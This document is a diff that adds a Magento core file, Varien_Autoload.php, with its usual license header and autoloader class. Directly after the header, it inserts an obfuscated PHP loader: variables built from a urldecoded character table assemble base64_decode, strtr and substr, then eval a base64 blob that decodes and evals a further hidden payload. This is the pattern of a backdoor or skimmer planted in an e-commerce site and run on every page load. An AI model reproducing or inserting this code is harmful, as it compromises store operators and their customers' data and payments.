@@ -1,0 +1,175 @@
+<?php
+/**
+ * Magento
+ *
+ * NOTICE OF LICENSE
+ *
+ * This source file is subject to the Open Software License (OSL 3.0)
+ * that is bundled with this package in the file LICENSE.txt.
+ * It is also available through the world-wide-web at this URL:
+ * http://opensource.org/licenses/osl-3.0.php
+ * If you did not receive a copy of the license and are unable to
+ * obtain it through the world-wide-web, please send an email
+ * to license@magentocommerce.com so we can send you a copy immediately.
+ *
+ * DISCLAIMER
+ *
+ * Do not edit or add to this file if you wish to upgrade Magento to newer
+ * versions in the future. If you wish to customize Magento for your
+ * needs please refer to http://www.magentocommerce.com for more information.
+ *
+ * @category   Varien
+ * @package    Varien_Autoload
+ * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
+ * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
+ */
+$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
+        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
+        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
+        eval($O00O0O("JE8wTzAwMD0ielhWaXNDRHhoUVRrUFN0RkJtZlJycXBXQWxLVWJlbkpjdk5JZEd3dWpvTEVNT1phWXlIZ0RCYVR1Y1FmdHFTbEVuYmp6S29WRkxyZ3dOZHZ5WWttTVVPSkhDUEdSQVpYSWlocFdlc3hFUTlQcHN3eGNLaDF5S08wcGc5R0pzYUFnS3RwTVR4bHZ2TzRwWE1yY2t1eGNUVlZxM3RBVkQxa1lLTkdoS2Z0SEN2QVdLakRoU1cwQjJWTlcyOWxobnhsdnZPNHBYTXJkU3VkSkNoVU1UeGxwUzBQaWVWckVzTzBNS2ZOeVR4bHZ2TzRwWE1yaWVWcmRldXJjVHo3Y1RWVnEzdEFWMXVscGEweEVuelJwc0pBeTNtbGRjVlZxM3RBVjF1bHBhMHJaU1hyaVBBeG9xQXhNS2EwSEJtR0pjVlZxM3RBVkR1ZEpzMU5IS2p1ZHNhQWdLdHBNVHhUTzFoMVNDbTBIWEhDSFJtQlNDTlFoMDVmcWFNNElEYXppWE9kU2tWZVZhVjFTUldmYURNNWF2aE92U3RuYWdiYWlhT2NWSzFWTWtsM2dzT1BJUm11cGxBMlZzT3VXa09JV2xOcXFhT25xa0ExTURxNU9TdjFZUk1mcVJtYnYyMVpXUnpaaWc1aUlYYWFZYUhFVzFIZmdhaGFWUmFYYVJObU1YNTNuMEhseXZ4ZWhYcmJ2bjlsU050RVdCYUpWU0g2V1JtdE1LakF2YUhwZ1J6bVdnNW5WQkhhcHNtMGF2TlJ2MUllTTFOWE1rSTNnUU5ocFh0Wk9CTklaM3pkVmM4VWh2dFRZUXE1eUJXZnBqbWNNMDFWblg0VWFLeDNpQmE2bmM5YVowZkRPM3hlSW5iNU1ET2tkRGoyZERXRlMwdGtPWDUyaVNJRHkyaEpkRHFmbkNWa1dsMFVTQnRSZ3ZOaE9DYlpudk9zeWxWWHZqSEVTMnhQaVNPMUhnYmZhVDlFcGdmYmFsMVpTdjFhcFhoUGFRaEJhTmhzeTA5M3YwT2ZpZ0E1SVF6R2dRdzFXQkhobktya0gybWZTM05KcHY5ZVZhejNWS09CaEJWbUgyT3FxQmE0dlFPQVd2OUdWdjVWSE5obGFDMTR2MmZCZ05KM2RETWZwUU9JTTF6SXZndURIRGhtTUROQU9jYk5uTmhiSVNoMnl2NXFIUkhKSVNoQ3luYlFJS05JVkNtU3ZLT2JuQ1hQeVNXMHZOcm5wU3o1bmFoekh2T0pTS2FST2tPNEgyMWZaMFdmSERoS2FqSFJZbGZkeWc1M2hTSDJwQ3VQU0RKMklCclhTa2w0aGdmbUhObDRwWHVQblJIanBzcmlJQlczSDI5ZVlYNVZ5WGFXZ05yQU0wWDV2QnJrSGtxNU1TV2VWWGxleUMxWElUOXJnUnpBSENidUhnYm1XM2FTU2pWQ08xaGVxMXowSFFxMk9sMUVJMlhQaE56UHBTcVVIUmhxYTBWbU1TT3ZxS2hJeXNIZUlCTzNJYzlBYUNiRHAyYmF5M3pESHZoUUkzYWx5MnQ1T0RqZGFqVm5WYUhYaDFIbmhnT0FnU2pscERhM1lrejNTRHQxVmpoVFZDOUlkMVZoYVJ0SlZRSDN2RHozZDN4NWFEaHZxdmZOSURsM1ZLT09JQ21lbkNQVUhSVnNZQm1rbkJ0YlozeDNhUm1PcTBOT1dnNDN5c09CeUJ0Nk1YOUt5amFmWkRodWQzTVVZQmFpcFNoUG5rVlJJS2JCcURqcUhST1dPU05DVkJYZU9rdzVIQnRFU1hmc2hTeEZpalZzWjJhMGdLQWZPS3ZEZDB0aE9EcTFhQno1SWtIdFZnYkJhTmhqT2dySVZYSHV2Mk5PdjFhbWFDVzVIS2g1U1hqSmFhT3Zudk5waHZiYmhhbXVZdmJkdlFtNEllOUNIa3JXT1g1MnlTSDNaMnR1T2thV3kyaFdhMDVsaGFhRVNRYXB2WGJOSGFWUGdjYlV2S1hVYTJWdVZhTTJkMGhpdkJ6Z3ZSbVFubGJKVjA1YWdnYmxPdlZDdkJBVW5YT3BnbjlkZDFyVWhRaFRhamxlZDIxYU0ycnJpbjkxTU5IbUlCVk9aMkFGbmF6WFowckRNQlYyYUs5RGgyMURJTmhRbjA5VHEwOEZ2MmJkTTBoQ2FYTkd2S3JzcEJyWGd2QVV5ZzVYVmdmNHZ2OTVxMU5tWXNIYk9LOWZpQ2hqSEJhUGExbFBXUnRLcGx1RkhSdFJNQmFlV1Q5TlplODVJTngyYVF0dUlLdUZhMjAyaHNPbWFqbXBTdlZVSTJoS2FjOVRIQmFMcGxoZVdCajZnU0pEcUR2NE9YbDNoMjFRcWdmY2dqbVNXMmF0cHNqTG52Ykpoc21GWWxmQmQzbDB2M0hLbk5ta25sTjRZQ3hlcTNqUGdLYVZwRFZRcWdmNHZnYWxTZ3hQYURJVUlTTnJkMlgzSVNhR1Z2OVpwQm01djI5ZFlsYmJuZ2hScXY5WldEaGxoWDFWVjFPZVZuYnRTVDkzZER6UldTeERXS1BESGdObm5OSEtnbDF2eUJ3RFMxSTRkM2FXWWdtbE9lOUJnUk5OZ1FtZ3ljODFuMnJoT2pPZVozYUNWbGpXaWcwVXBsTzBkMnREaVNoR2dYSHJZbE9OTVFKMnZCYWpxMGFWU0tIVHBRTzNIMjFReTNtcmhhTm5PMVZ0aGdXVXBCbWpJTmpkWWtWNHZnNTZhYzlUZGU5cnl2dTFuMWpzbnZqdHAzdGlWWEowcFhycklsSTFWMjFxeTNoalZESDZwdjhmWkRqWEkwOUxZYXI2bkNJRnZDZlVTYU9VeWdOTmF2YnVIYXYycTBIYWdOV2Zxa05JbkM5QWlqbDFZTk5WT3NobnkxclVPMDRVVzN0S1ZsSEdPQ2FlSVNqRmFzTjVJS1BleWdhRHBjYnBTUnowbjFJUGlYdGRkMnQ1WkRtNFlrSkZJMm1aTzF0dE8xaEZXa1ZsTWtWQk9zYTRJa3ZmV3Y4M1YwSTNJak9HV3ZIZUhYdEtWdjFHeWVicWlRTmx2a1ZDSEN0MFN2dURuYXpreTBIR0lOT0V5a08zTTFOYUhRT2JuRHZlbmpoek1STkdpU21WbkRPRGh2ajVnanQyV0JoV01ncTVXM1cwTUM5aldESjF2Z0pmSTBoZ0lnNUJxbE9zdjBORWgxcTVWbGIzYUN0YXYySGdNakg0TURoUHlnNDRuZ090Z1FhcXFSVnFwa1hEaHZtUHZzalpuQ3J1WU5hS3lscm5XVDlMSVJhVWhrWEZIQkpmTWc1YkhnV0RwQ2FXdmw1bEhET095UlgxV2ViRWlDajJJUU9RbmwwMUhnaDN5a3cySTBQNVczSHBpanQ1cWtyZmlqeEZxM0hkV0J4VWl2aDZJMjlwVmpOT1ZqSmV2Mk9zSGx0MXBOdkRoUnpWWWp6MlYwUDFJMXJFeVJIWFNTSGhxdmhaaFh4M08yUDVIbHJyZDFqbGlhejF5Q2hHYVN6Y2lhTk9aME5OT1NITElCWDNZU05XaGVibk9lODRISzQ1aDI4VWlTaDZNdnRxUzJxNVl2VnVoSzF0U2doY01lOTZIMUk0YUJINnBnYlRNbE5SeWphR2gycmtoS3R2dnZxMW5hTlVWUmFTbjBPR2hETnRJMDlzTXZIMGdSYWJwZ1ZOWVhOemlCT0ZWTmphcWFOZ25nMUNWYW1yU0RoR1dnOUR5bDA1eWc4NHZnTlVhak9DaUJ6bllzdGNwQnRrcDFyMU1hT0toc3JiWWpqUEhhdFFZWE9ubkRoM2EzTkZ5c2FySEtWbnZnYU9oMWo0Z2pNRFNCeERTa01EYXNWVFd2YlJpdlcwYWpOTFlhVnZTanpVeTBhZk1qYWZuQ21zZ2tqZnlrYWxnSzFucWxWanZ2OTBnbE5QWVFWcEgyNWFTQmhFaERYNWlDanNnTkoyU2xWMk9TTlhJUnRJaUJoWEllOFVkMU5lSDByZ0kybW1NYVZCZ1hqenZYSmVXa3cweWFqZ1ZuOXJ5S09wbnN0NXFhYW5WWHRHTWxydnZqbUFudjFiVmdPZ0gwdFdXYWFBaGFyQkh2eERnc2g0SVJ6a09EbWNxMU90T0RqQm5OTnNNc1YwVkJOY2hEVlpXQnJOTW5ibHFTbFBoQzVXZ2F0QVdSVmVIdko0T1JPblMyOTBTYWhkdlF0WkhLeDRNQkg1U0ttdlMwMEZoMVdEU1gwMElsT1BNME5uT3NtUWFObVZnc2hEWWFXVW5EdENpYW1BeVNtbWREYVJZbjlaYXYxRUl2OXNPZ3gzSGFIdHFSenBIamhmV2F2ZVcwckxoMjlMWWcxZ3BYbTBWZzhQVzA1RU0xanZIbGJKcENNREhrdjVwMGYxaENhSVNLakxIME5aT0JWbVlsYjRhMGpueUJ6cGd2T2RWc2EwbkJhWGFzSTB2ak5CVzBPbG5LYXF2Z05VcURxZWhOSGNNM09rVjN6dHFTbWJJUnYwbmFIRUkzYTNNU2xmSENXNFlSTkxJUnpQaGFydXkwYjB5S041dmxJVXkzSFNoMW1qVlJhWHFhdjF5S1ZxcDBPdlNSTmRXZ2ZsYVJoaVlnZmpwQmphcWxOWkhzbUZhMGFBTUtyenAxT3VIS1ZxSGcxU1NhbGVTM21SV05ybXBYcm52S0hkZ0J6cGdhT1NJS3RzbmxoT1NTVkpNTm0yZDF6a3BnWDNnbmJkTUthWElDaFd5akhCcDN2RmhqaktPc2FaZ0JoZk9LdHRXMmhXaXZmVmdLOUZNUU9mU0toYnEzemVpUUpmVzA1R1cwSDNZZ05ESTI1UWdDYVZ5Z1AwVks5cXBDTmZTbGpqUzJWTlZEaDNoUk8yZ1hPM0hhd0ZJZ2FjSHZ0RU9Tam5IYXp1aHZmemd2VkFTa20wbjJhYW4wYTVTbHJPdmFPUXZLNWtJQ2FRVmptNmd2aE9aMWFGWW44UGFLckpuMXFlV2t6cFlYclRTWEhGcXZOUWEyTTNIanJzTzBIbXBLdERubGZ1cEtIU2hEVjNWMjFudkNJMnkxSTJnUXdEbkRqdnlzclh2RGgzU0J6T2dCajNxTk5kWUtqc2FlYnRTSzlMaVFoVlNlOVBubHRpaFNoMk1SYTVZQkEzbktiWHlTaHNTdmZPeWdtR25OT0Jnc3JESUttMWdqVnRNWDlTV05yRHlUOFB2c21CYXNtWHkyMDNZQmFoaFF0ZU1rbGVZUWEybkNqVGFsOGVhMG1aT3Z1M1drSGhNWGp1WWxqUk1OdHRXYWhkZ1NqVW52MXpWQ05SSGxhUlZCVlFhQ3RUeUNiR1lYMXpua21UZERhUUlSbW5PS2hpaXZWYk9CaGV5MjliTWp3ZlNReDV5U2o2ZDNtNlcyZjVTU3pyblF4MFZscmpudjF0cDBqVk9TYW55a3RDVjBiYnl2aENuUkpQaDBYZXBDcld5MU9VdjFWaG4yNXVwMk9GU2pIcWEzT1NoMUpmcTN6QUlSYWNoMHQwaGtyYkkzdGduTmozZ0JqWkgzSG5wMmIzV0R6WllDVjNZbGFaSFFobnkwbXJ5c2wyTWFOY3FsSlBWTkpEbmcxSmhhbVNoMGFRcGpYZm52TzBTQmhTZ3ZmUU1LYnRTQ0hXVzByWm52MTZ2MG1qblJ0SlZrT1Z2MGJuZ3ZKM25LYTRua0lQaFNXZU9LYlFJM2h2WVNNM1dOdHZXS1hVdkttR0hDZmlhMmhxVlJPdFdCbVR2WGFoV3ZtVVdEdEdudmprU2wxR3ZDYVphU21yaUM1R1ZRbWdIa3dESVJqR2dLbXRoWDEwT1NtdEkxdHBxMmhOVjJ2MElOckJNUUhGaGxQRnEwTjVuQzVmTWwxaFlYYnNuU2puWUt0UUlzaEdIZ21SdlhWdHZnVlBhMk5uYXZ2Rm5YWEZPbFZBTWpPNHFCelFPc0h0T0RYNXlDMFBpUXE1TzNqNldTamZTWDVkSVFIenZRekJoME5JcWF0M252Vnp5Q3RxZ2pOTmQxYVFxMmF1djB0UGQxT0dhUVZQdmt6dXBEYTBIM2FUaVhPUWdLcm52S3gzVjFhbUlYMWpIM0hVVnZ2NUhYdFh5Y3VVZ1h0a3kxVkxTM3hESUtPR1lLOW5NMDRmaDIxbnZLYlh5S3I1VmM5QXkwQTFXRG0zcTJ0UHZnT2hWZzBQT2x0V2EwWEZTMFAxaEM5R2FsbVVwdnJ0V2FOUnFEbXJwdmpQTXNPSk0xSFdJak41STIwRFl2aGlJU1czbjJqTHl2T1FWYWpRVnZhdXAwTmNIUWgzcUJ6bUkyYmtIU3RCSFF0S0hSdEVPM0hmeWdqSWQybTRnZ3RrdmdtM01qVnVZWDFTcUJPaVZnMW1IQlhmVzNhUHBYYURPMHI0aHNqbk1sZlpJMlAwdjJtbmdzbGVTWEhFTTF0dG4zdFJwdk41V2FWcnFCd0RJMGF2VjJOZk1qdGJWU200YUtiUk1YcmNPZ05YdjFxZWljYk5NUXcycGp6YWlDMDBJTlZ6VnZiUWgwcUZhMnRacWdiWGFhanBuWG02T1h4NGd2YmphWE9HWUNPZVNnSTJoMDRmcE5tRlZraGJ5MDVqbnZ2ZlNsWDNXU2hGSWxQMHZDVnZPMlZuVks5T3ZsYnFxdmpkU2t6a2FzaklwWEhMbmpoaFMyYUxNWDVUblNPQlNRSUZnc2hxU0RONFYwNFVhS0gxYWtqdHZsbTFwSzlOZ2xKNU1ST0JTbEhQSDBPdGgxaElTQ2hjV05Wc2hzbUNXM0hqcTFhc2dscnZnQkhjYWpOdWF2T1NuM2FoTVhWMm52ZjRnc21lSVh4VVZ2ZmpPanRESTN6dHlYakZxZTk0bmpOM0hsSFVWWG1rT0J6alZSdFB2bDFKYTI1bVZnNWduS3FlT1hIMG5YYlNwMmJXU2xiMHZ2OTZoMnRqVlJOa25DZmNIUVgzVmdPQWRET3p2MXJ2eWdtcG5sSVVhMk5wYVhIY3YwSGRIMVZweTI5bnB2cmtxa21iZ2tPS3lRTmVnc0o0aGtPRWhCcnVJRGFTWXY5UEgyZlVnQnpWbjJIUlNhalBuUm1rbnNPNlcyT3FoZzlWaFJoQ2lYMTNoWDVVSFQ5WEhRTlVPZ2FpT2p0Zmh2cmhTZ00wTTBWUnBnSERudmEwcWw1SldnOUd2Uko0cENmcXZnZkNTS3JsT2FOZlNDcnNNdjF6TWdIMGQyakFIMDFOaWFYMk8wWDJ5M3pQWVJtRUh2NVZkMjVhWUM1NVczSGJ5dmhMTWxhVlMxenpoc091YVhiZm5ndHFwanJLcVNIMmFOSGhobDlXVmViV3ExT0VuMWFrdjA5elMxbXRuUWFjbkRWV1NnNVVIU2pJSUJ6VEhsSGZ5MlZhWUJ2RklzdmZ5U0pEeWFNMk8yNVdnQ21xV2d0Y1d2cTNuS3hVYVJWR3BLclVPRGhyU2p6YnFLOWNJTnpGcWc1VXlrdGpuUnQzSENmVFdLaktXUkhrcEtWbE1DNTFIQ2YwcTNxZkkwcTBoQnRBcDNWV3BST2RNMGFobkNhVmdScWZJWE5jT1hoSllrSE9kMGFzbmxBMVlTTmdXS1gzTzJqZVdnbXBoU0hUTWthRGhzVjJWa09pVjNPQVdsSGVxdlhlWU5OT09DOWZxM0h0U2ptaFNnaEdITlZHVmd1Rk9DYTVIY2IwaHNWdU9ObTFIU2pwSVFtNmEzd2VZU1ZGZ2Nick1EVzRIMDE1WjBiYmFDSDVJY2JhcFhoNXZLMGZwMnREdmptc1ZhalhhMjgyT1Q5Z0lqaHB2TmhXZ1FJZnlEbUpJME9sSEtOT0lOT2tNSzAxdjNtUFdhcTRNQmhpWjF3Zk1hTURhUU4yZ1NoMHBuOXVJQ2hldmN1MnlET1NaMUhQV050WElEakVNU1ZVdmtqaXBzYTJZa2pQSDNoMWFSTjJwYU4zcFNOTFlReDNTYVZLVkMxY2hLcmVaREhhWWdiamhhaDFJYzhlaXZyZWdjYnJPM1dlaVhtcGhuOUtKVGxyaVBBL0V4PT0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7"));
+
+/**
+ * Classes source autoload
+ */
+class Varien_Autoload
+{
+    const SCOPE_FILE_PREFIX = '__';
+
+    static protected $_instance;
+    static protected $_scope = 'default';
+
+    protected $_isIncludePathDefined= null;
+    protected $_collectClasses      = false;
+    protected $_collectPath         = null;
+    protected $_arrLoadedClasses    = array();
+
+    /**
+     * Class constructor
+     */
+    public function __construct()
+    {
+        register_shutdown_function(array($this, 'destroy'));
+        $this->_isIncludePathDefined = defined('COMPILER_INCLUDE_PATH');
+        if (defined('COMPILER_COLLECT_PATH')) {
+            $this->_collectClasses  = true;
+            $this->_collectPath     = COMPILER_COLLECT_PATH;
+        }
+        self::registerScope(self::$_scope);
+    }
+
+    /**
+     * Singleton pattern implementation
+     *
+     * @return Varien_Autoload
+     */
+    static public function instance()
+    {
+        if (!self::$_instance) {
+            self::$_instance = new Varien_Autoload();
+        }
+        return self::$_instance;
+    }
+
+    /**
+     * Register SPL autoload function
+     */
+    static public function register()
+    {
+        spl_autoload_register(array(self::instance(), 'autoload'));
+    }
+
+    /**
+     * Load class source code
+     *
+     * @param string $class
+     */
+    public function autoload($class)
+    {
+        if ($this->_collectClasses) {
+            $this->_arrLoadedClasses[self::$_scope][] = $class;
+        }
+        if ($this->_isIncludePathDefined) {
+            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
+        } else {
+            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
+        }
+        $classFile.= '.php';
+        //echo $classFile;die();
+        return include $classFile;
+    }
+
+    /**
+     * Register autoload scope
+     * This process allow include scope file which can contain classes
+     * definition which are used for this scope
+     *
+     * @param string $code scope code
+     */
+    static public function registerScope($code)
+    {
+        self::$_scope = $code;
+        if (defined('COMPILER_INCLUDE_PATH')) {
+            @include COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . self::SCOPE_FILE_PREFIX.$code.'.php';
+        }
+    }
+
+    /**
+     * Get current autoload scope
+     *
+     * @return string
+     */
+    static public function getScope()
+    {
+        return self::$_scope;
+    }
+
+    /**
+     * Class destructor
+     */
+    public function destroy()
+    {
+        if ($this->_collectClasses) {
+            $this->_saveCollectedStat();
+        }
+    }
+
+    /**
+     * Save information about used classes per scope with class popularity
+     * Class_Name:popularity
+     *
+     * @return Varien_Autoload
+     */
+    protected function _saveCollectedStat()
+    {
+        if (!is_dir($this->_collectPath)) {
+            @mkdir($this->_collectPath);
+            @chmod($this->_collectPath, 0777);
+        }
+
+        if (!is_writeable($this->_collectPath)) {
+            return $this;
+        }
+
+        foreach ($this->_arrLoadedClasses as $scope => $classes) {
+            $file = $this->_collectPath.DIRECTORY_SEPARATOR.$scope.'.csv';
+            $data = array();
+            if (file_exists($file)) {
+                $data = explode("\n", file_get_contents($file));
+                foreach ($data as $index => $class) {
+                    $class = explode(':', $class);
+                    $searchIndex = array_search($class[0], $classes);
+                    if ($searchIndex !== false) {
+                        $class[1]+=1;
+                        unset($classes[$searchIndex]);
+                    }
+                    $data[$index] = $class[0].':'.$class[1];
+                }
+            }
+            foreach ($classes as $class) {
+                $data[] = $class . ':1';
+            }
+            file_put_contents($file, implode("\n", $data));
+        }
+        return $this;
+    }
+}
